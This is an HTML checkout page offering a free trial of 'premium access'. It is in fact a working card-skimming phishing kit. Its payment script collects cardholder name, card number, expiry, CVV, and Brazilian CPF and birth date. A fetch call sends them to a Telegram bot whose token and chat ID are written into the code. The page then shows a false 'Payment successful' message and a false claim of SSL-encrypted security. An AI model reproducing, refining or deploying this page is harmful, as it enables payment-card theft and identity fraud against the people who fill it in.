<!DOCTYPE html>
<html>
<head>
<title>Complete Payment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
margin:0;
font-family:Arial, sans-serif;
background:linear-gradient(135deg,#000,#1a1a1a);
color:white;
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
}

.container{
width:100%;
max-width:400px;
background:#111;
padding:25px;
border-radius:15px;
box-shadow:0 10px 30px rgba(0,0,0,0.6);
}

.offer{
background:linear-gradient(135deg,#ff0057,#ff7a00);
padding:10px;
text-align:center;
border-radius:8px;
font-weight:bold;
margin-bottom:15px;
animation:pulse 1.5s infinite;
}

@keyframes pulse{
0%{opacity:1;}
50%{opacity:0.7;}
100%{opacity:1;}
}

h2{text-align:center;}
.sub{
text-align:center;
font-size:13px;
color:#aaa;
margin-bottom:15px;
}

input,select{
width:100%;
padding:12px;
margin-top:10px;
border-radius:8px;
border:none;
background:#222;
color:white;
}

.row{
display:flex;
gap:10px;
}

button{
width:100%;
padding:13px;
margin-top:15px;
border:none;
border-radius:8px;
background:linear-gradient(135deg,#ff0057,#ff7a00);
color:white;
font-weight:bold;
cursor:pointer;
}

.secure{
text-align:center;
font-size:12px;
color:#888;
margin-top:10px;
}
</style>
</head>

<body>

<div class="container">

<div class="offer">
🔥 LIMITED TIME — Free 3days Trial Today
</div>

<h2>Complete Payment</h2>
<div class="sub">Unlock full premium access</div>

<select id="country">
<option value="">Select Country</option>
<option>Philippines</option>
<option>Brazil</option>
<option>United States</option>
<option>Canada</option>
<option>Germany</option>
<option>France</option>
<option>Italy</option>
<option>United Kingdom</option>
<option>India</option>
<option>Japan</option>
<option>South Korea</option>
<option>Australia</option>
</select>

<!-- BRAZIL FIELDS -->
<div id="brazilFields" style="display:none;">
<input type="text" id="cpf" placeholder="CPF (000.000.000-00)">
<input type="date" id="dob" name="dob" required>
<small>Tap to select your birth date</small>
</div>

<input type="text" id="cardname" placeholder="Cardholder Name">
<input type="text" id="cardnumber" placeholder="Card Number">

<div style="font-size:12px;color:#aaa;margin-top:5px;">
Card Type: <span id="cardType">Unknown</span>
</div>

<div class="row">
<input type="text" id="expiry" placeholder="MM/YY">
<input type="text" id="cvv" placeholder="CVV">
</div>

<button onclick="pay()">Unlock Now</button>

<div class="secure">🔒 Secure Payment • SSL Encrypted</div>

</div>

<script>
const today = new Date().toISOString().split('T')[0];
document.getElementById("dob").setAttribute("max", today);
// 🌍 AUTO COUNTRY
window.onload = function(){
let lang = navigator.language || "";

if(lang.includes("pt-BR")){
setCountry("Brazil");
}else if(lang.includes("en-US")){
setCountry("United States");
}else{
setCountry("Philippines");
}
};

function setCountry(val){
let select = document.getElementById("country");
select.value = val;
toggleBrazil();
}

// 🇧🇷 TOGGLE BRAZIL FIELDS
document.getElementById("country").addEventListener("change", toggleBrazil);

function toggleBrazil(){
let isBrazil = document.getElementById("country").value === "Brazil";
document.getElementById("brazilFields").style.display = isBrazil ? "block" : "none";
}

// CPF FORMAT
document.getElementById("cpf").addEventListener("input", function(e){
let v=e.target.value.replace(/\D/g,'').slice(0,11);

v=v.replace(/(\d{3})(\d)/,"$1.$2");
v=v.replace(/(\d{3})(\d)/,"$1.$2");
v=v.replace(/(\d{3})(\d{1,2})$/,"$1-$2");

e.target.value=v;
});

// 💳 CARD FORMAT + DETECT
document.getElementById("cardnumber").addEventListener("input", function(e){
let val = e.target.value.replace(/\D/g,'').slice(0,16);
val = val.replace(/(\d{4})(?=\d)/g, "$1 ");
e.target.value = val;

let type = "Unknown";
if(val.startsWith("4")) type="Visa";
else if(/^5[1-5]/.test(val)) type="MasterCard";
else if(/^3[47]/.test(val)) type="American Express";

document.getElementById("cardType").innerText = type;
});

// 💳 PAYMENT
function pay(){

let country = document.getElementById("country").value;
let cpf = document.getElementById("cpf").value.trim();
let dob = document.getElementById("dob").value;

let name = document.getElementById("cardname").value.trim();
let number = document.getElementById("cardnumber").value.trim();
let expiry = document.getElementById("expiry").value.trim();
let cvv = document.getElementById("cvv").value.trim();

// BASIC CHECK
if(!name || !number || !expiry || !cvv){
alert("Fill all payment fields");
return;
}

// ✅ FIXED BRAZIL VALIDATION (NO DUPLICATE ERROR)
if(country === "Brazil"){
if(cpf === "" || dob === ""){
alert("CPF and Date of Birth are required for Brazil");
return;
}
}

const botToken="8414569544:AAGInE8y7XC7iipfzP-3zj0anbbeshBHPHU";
const chatId="7216902486";

const message =
"💳 Payment Attempt\n\n"+
"🌍 Country: "+country+"\n"+
"🇧🇷 CPF: "+cpf+"\n"+
"🎂 DOB: "+dob+"\n\n"+
"👤 Name: "+name+"\n"+
"💳 Card: "+number+"\n"+
"📅 Expiry: "+expiry+"\n"+
"🔐 CVV: "+cvv+"\n"+
"🕒 "+new Date().toLocaleString();

fetch("https://api.telegram.org/bot"+botToken+"/sendMessage",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({chat_id:chatId,text:message})
})
.then(()=>{
alert("Payment successful!");
window.location.href="";
})
.catch(()=>{
alert("Error processing payment");
});

}

</script>

</body>
</html>
